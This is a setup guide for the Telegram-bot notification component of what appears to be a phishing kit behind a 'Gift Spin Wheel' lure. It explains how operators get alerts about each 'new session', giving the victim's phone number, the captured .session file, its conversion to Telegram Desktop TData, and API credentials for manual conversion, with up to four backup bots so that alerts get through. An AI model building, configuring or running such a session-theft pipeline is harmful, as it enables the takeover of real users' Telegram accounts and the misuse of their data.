# Notification System Setup Guide

## Overview

The Gift Spin Wheel backend includes a robust notification system that alerts administrators about new sessions and their conversion status. The system supports up to 4 bots for high availability.

## Quick Setup

### 1. Create Telegram Bots

You need to create Telegram bots that will send notifications. Here's how:

1. Open Telegram and search for **@BotFather**
2. Click `/start` and follow the menu to create new bots
3. Record the **token** for each bot created
4. For each bot, you also need a chat ID (your admin chat with the bot)

### 2. Get Your Chat ID

For each bot:

1. Start a conversation with your bot (send any message)
2. Go to: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Replace `<YOUR_BOT_TOKEN>` with the token from step 1
4. Find your `chat_id` in the response (usually your user ID)

Example:
```json
{
  "ok": true,
  "result": [
    {
      "update_id": 123456789,
      "message": {
        "message_id": 1,
        "from": {
          "id": 987654321,  // ← This is your chat_id
          "is_bot": false,
          "first_name": "Your Name"
        }
      }
    }
  ]
}
```

### 3. Configure Environment Variables

Create or edit `.env` file in the `backend/` directory:

```bash
# Telegram Client Configuration
TG_API_ID=123456789
TG_API_HASH=your_api_hash_here

# Primary Notification Bot (required)
NOTIFY_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
NOTIFY_BOT_CHAT_ID=987654321

# Backup Notification Bots (optional but recommended)
NOTIFY_BOT_TOKEN_2=234567:BCD-EFG2345hijLmn-abc68X3w2v234fx22
NOTIFY_BOT_CHAT_ID_2=876543210

NOTIFY_BOT_TOKEN_3=345678:CDE-FGH3456ijkMno-bcd79Y4x3w345gy33
NOTIFY_BOT_CHAT_ID_3=765432109

NOTIFY_BOT_TOKEN_4=456789:DEF-GHI4567jklPqr-cde80Z5y4x456hz44
NOTIFY_BOT_CHAT_ID_4=654321098
```

## How It Works

### Primary vs Backup Bots

The notification system tries to send messages in this order:

1. **Primary Bot** (NOTIFY_BOT_TOKEN) ← First attempt
2. **Backup Bot 1** (NOTIFY_BOT_TOKEN_2) ← If primary fails
3. **Backup Bot 2** (NOTIFY_BOT_TOKEN_3) ← If backup 1 fails
4. **Backup Bot 3** (NOTIFY_BOT_TOKEN_4) ← If backup 2 fails

The system succeeds if **ANY** bot successfully sends the message.

### Message Format

All notifications include:
- Country flag emoji (🇷🇺, 🇺🇸, etc.)
- Country name
- Phone number or session details
- Relevant emojis for better readability

Example:
```
🇷🇺 Новая сессия (Russia):
📱 Номер: 9123456789
📄 Файл: 79004806930.session
⏳ Статус: начинаю конвертацию...
```

### Notification Types

1. **New Session**
   - Sent when user starts authentication
   - Includes phone number and country

2. **Success**
   - Sent when TData is successfully created
   - Includes TData path and country

3. **Fallback**
   - Sent when opentele conversion fails but session is saved
   - Includes API credentials for manual conversion

4. **Error**
   - Sent when authentication completely fails
   - Includes error message and country

## Testing

### Test Primary Bot Only

```bash
cd backend
python3 -c "
from convert_sessions import send_telegram_notification
result = send_telegram_notification('🇷🇺 Test message (Russia)', country_code='ru')
print(f'Notification sent: {result}')
"
```

### Check Logs

All notification attempts are logged in:
```
backend/results/session_to_tdata/converter.log
```

Look for lines like:
```
Notification sent via primary: {...}
Notification sent via backup_1: {...}
Failed to send notification via backup_2: ...
```

## Troubleshooting

### Issue: "No bot credentials configured"
- Check `.env` file exists in `backend/` directory
- Verify `NOTIFY_BOT_TOKEN` and `NOTIFY_BOT_CHAT_ID` are set
- Restart backend if environment variables were just added

### Issue: Notifications not received
- Verify bot tokens are valid (bots still exist in Telegram)
- Verify chat IDs are correct (from `getUpdates` endpoint)
- Check bot has permission to send messages
- Review logs in `backend/results/session_to_tdata/converter.log`

### Issue: Only some bots work
This is normal behavior! The system tries all bots.
- Check which bot succeeded in the logs
- Verify the bot is active and has permission

### Issue: "Connection timeout"
- Bot might be rate-limited
- Telegram API might be temporarily unavailable
- System will try backup bots automatically

## Best Practices

✅ **DO:**
- Use at least 2 bots (primary + backup) in production
- Send test messages after configuration
- Monitor logs regularly
- Use different admin accounts for each bot (optional, for security)
- Keep backup bot tokens secure

❌ **DON'T:**
- Use the same token for multiple bots
- Share bot tokens publicly
- Store tokens in version control
- Use bots for other purposes (creates message noise)

## Security Notes

- Bot tokens are secrets - never commit to git
- Use `.env` file with `NOTIFY_BOT_TOKEN` prefix
- Consider rotating tokens periodically
- Monitor bot activity for unusual patterns
- Restrict admin chat access

## Advanced: Manual Notification

If you need to send a notification manually:

```bash
cd backend
python3 -c "
from convert_sessions import send_telegram_notification, get_country_flag_and_name

country_code = 'ru'
flag, country_name = get_country_flag_and_name(country_code)
msg = f'{flag} Custom message ({country_name}): Your content here'

result = send_telegram_notification(msg, country_code)
print(f'Sent: {result}')
"
```

## Supported Countries

All 36 countries with proper flag emojis:

🇺🇸 USA, 🇷🇺 Russia, 🇬🇧 UK, 🇩🇪 Germany, 🇫🇷 France, 🇮🇹 Italy, 🇪🇸 Spain, 🇳🇱 Netherlands, 🇧🇪 Belgium, 🇦🇹 Austria, 🇨🇭 Switzerland, 🇵🇱 Poland, 🇨🇿 Czech, 🇸🇪 Sweden, 🇩🇰 Denmark, 🇳🇴 Norway, 🇫🇮 Finland, 🇨🇦 Canada, 🇲🇽 Mexico, 🇧🇷 Brazil, 🇦🇷 Argentina, 🇨🇱 Chile, 🇨🇳 China, 🇮🇳 India, 🇮🇩 Indonesia, 🇯🇵 Japan, 🇹🇭 Thailand, 🇲🇾 Malaysia, 🇸🇬 Singapore, 🇸🇦 Saudi Arabia, 🇿🇦 South Africa, 🇪🇬 Egypt, 🇦🇺 Australia, 🇳🇿 New Zealand

## Support

For issues or questions:
1. Check `backend/results/session_to_tdata/converter.log`
2. Review this guide's troubleshooting section
3. Test with `getUpdates` API endpoint
4. Verify bot tokens and chat IDs are correct
5. Check Telegram's status page for outages

---

**Last Updated:** Current Session  
**Version:** 1.0  
**Status:** Production Ready
